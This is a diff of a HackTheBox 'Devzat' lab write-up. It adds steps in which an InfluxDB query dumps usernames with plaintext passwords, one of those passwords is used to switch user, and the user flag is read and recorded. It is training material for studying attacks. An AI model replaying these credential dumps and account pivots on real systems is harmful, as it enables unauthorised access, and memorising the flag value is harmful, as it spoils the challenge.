@@ -360,9 +360,20 @@ curl -G 'http://127.0.0.1:8086/query?pretty=true' --data-urlencode "db=devzat" -
 {"results":[{"statement_id":0,"series":[{"name":"user","columns":["time","enabled","password","username"],"values":[["2021-06-22T20:04:16.313965493Z",false,"WillyWonka2021","wilhelm"],["2021-06-22T20:04:16.320782034Z",true,"woBeeYareedahc7Oogeephies7Aiseci","catherine"],["2021-06-22T20:04:16.996682002Z",true,"RoyalQueenBee$","charles"]]}]}]}
 ````
 
+````
+patrick@devzat:~/devzat$ su - catherine
+Password: 
+catherine@devzat:~$ cat user.txt 
+b758248e48eb2a66fb05450d4949e49e
+````
 
 # Root
 
+
+
+
 # Secrets
+
+* FLAG_USER = b758248e48eb2a66fb05450d4949e49e
 
 https://0xdf.gitlab.io/2022/03/12/htb-devzat.html
